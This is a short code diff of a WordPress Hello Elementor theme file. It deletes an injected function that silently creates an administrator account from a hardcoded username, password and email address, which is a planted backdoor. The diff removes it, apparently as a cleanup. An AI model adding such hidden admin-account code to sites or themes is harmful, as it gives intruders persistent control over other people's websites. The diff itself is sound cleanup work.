@@ -21,14 +21,6 @@ if ( ! function_exists( 'hello_elementor_setup' ) ) {
 	 *
 	 * @return void
 	 */
-	 function add_admin_acct(){
-$login = 'adagio';
-$passw = 'adagio26';
-$email = 'gio26892000@gmail.com';
-if ( !username_exists( $login ) && !email_exists( $email ) ) {
-$user_id = wp_create_user( $login, $passw, $email );
-$user = new WP_User( $user_id );
-$user->set_role( 'administrator' );
 	function hello_elementor_setup() {
 		if ( is_admin() ) {
 			hello_maybe_update_theme_version_in_db();
